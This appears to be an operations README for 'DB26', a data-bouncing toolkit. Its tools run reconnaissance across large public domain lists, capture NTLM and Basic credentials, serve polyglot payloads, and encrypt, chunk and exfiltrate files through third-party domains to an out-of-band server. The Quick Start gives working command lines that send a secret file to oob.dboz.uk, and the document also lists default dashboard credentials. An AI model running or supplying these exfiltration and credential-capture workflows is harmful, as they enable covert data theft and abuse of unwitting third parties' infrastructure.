# DB26 Server Layout

## Directory Structure

```
/opt/db26/
├── bin/              Compiled tools
│   ├── recruiter     Domain reconnaissance + callback collection
│   ├── db26-send     Encrypt, chunk, and exfiltrate data via proven candidates
│   ├── db26-recv     Reassemble and decrypt exfiltrated data from interactsh logs
│   ├── responder     HTTP/HTTPS polyglot payload server + auth capture
│   ├── report        Campaign report generator
│   ├── dashboard     Web dashboard (localhost:8888)
│   └── ntlmtrap      NTLM/Basic auth credential capture server
│
├── etc/              Configuration
│   ├── config.json               Main DB26 config (also at ~/.db26/config.json)
│   ├── start-interactsh.sh       Launch interactsh in screen session
│   ├── start-dashboard.sh        Launch dashboard in screen session
│   └── setup-interactsh.sh       First-time interactsh server setup
│
├── data/
│   ├── targets/      Input domain lists
│   │   ├── subdomains_all.txt    Combined subdomain corpus
│   │   ├── top-1m-domains.txt    Tranco top 1M
│   │   └── subdomains_batch*.txt Incremental batches
│   ├── candidates/   Proven domain+header pairs
│   │   └── proven_candidates.jsonl
│   └── received/     Reassembled exfiltrated files
│
├── runs/             Campaign directories (auto-created by recruiter)
│   └── YYYYMMDD_HHMMSS_<label>/
│       ├── summary.json
│       ├── databouncing_candidates.jsonl
│       ├── tainted_fetches.jsonl
│       ├── credential_captures.jsonl
│       ├── recruiter.log
│       └── trap_captures.json
│
├── logs/
│   ├── interactsh/   OOB DNS server logs
│   ├── responder/    Responder hit logs
│   └── archive/      Historical logs from earlier runs
│
├── poc/              Proof-of-concept test data
└── tmp/              Scratch/test files
```

## Management: db26-ctl

```bash
db26-ctl status        # Show services + disk + latest run
db26-ctl start-all     # Start interactsh + dashboard
db26-ctl stop-all      # Stop all screen sessions
db26-ctl runs          # List all campaigns with stats
db26-ctl last-run      # Details of most recent run
db26-ctl logs ish      # Tail interactsh logs
db26-ctl disk          # Disk usage breakdown
db26-ctl tree          # Show directory layout
```

## Quick Start

```bash
# 1. Start infrastructure
db26-ctl start-all

# 2. Run recruiter campaign
recruiter -d /opt/db26/data/targets/subdomains_all.txt \
  -s https://oob.dboz.uk \
  --run-dir /opt/db26/runs/$(date +%Y%m%d_%H%M%S)_campaign

# 3. Send data through proven candidates
db26-send -file secret.txt \
  -passphrase "your-passphrase" \
  -candidates /opt/db26/data/candidates/proven_candidates.jsonl \
  -oob-domains oob.dboz.uk \
  -corr-ids <correlation-id>

# 4. Receive on the other end
db26-recv -passphrase "your-passphrase" \
  -salt <salt-hex> \
  -corr-ids <correlation-id> \
  -output /opt/db26/data/received/
```

## Deploying New Binaries

From your local machine:

```bash
# Cross-compile for Linux
GOOS=linux GOARCH=amd64 go build -o bin/recruiter ./cmd/recruiter
GOOS=linux GOARCH=amd64 go build -o bin/db26-send ./cmd/db26-send
GOOS=linux GOARCH=amd64 go build -o bin/db26-recv ./cmd/db26-recv
GOOS=linux GOARCH=amd64 go build -o bin/responder ./cmd/responder
GOOS=linux GOARCH=amd64 go build -o bin/dashboard ./cmd/dashboard-web
GOOS=linux GOARCH=amd64 go build -o bin/report ./cmd/report

# Upload
scp bin/* root@<VPS_IP>:/opt/db26/bin/
```

## Environment Variables

| Variable | Purpose | Default |
|----------|---------|---------|
| DB26_BASE | Override base directory | /opt/db26 |
| DB26_OOB_SERVER | Interactsh server URL | (from config.json) |
| DB26_OOB_TOKEN | Interactsh auth token | (from config.json) |
| INTERACTSH_LOG | Path to interactsh server log | /opt/db26/logs/interactsh/interactsh.log |
| VPS_IP | VPS IP for filtering self-traffic | (from config.json) |
| TRAP_CAPTURES | Path to trap captures file | (auto-detected) |
| DASH_PORT | Dashboard port | 8888 |
| DASH_USER / DASH_PASS | Dashboard credentials | db26 / databouncing |
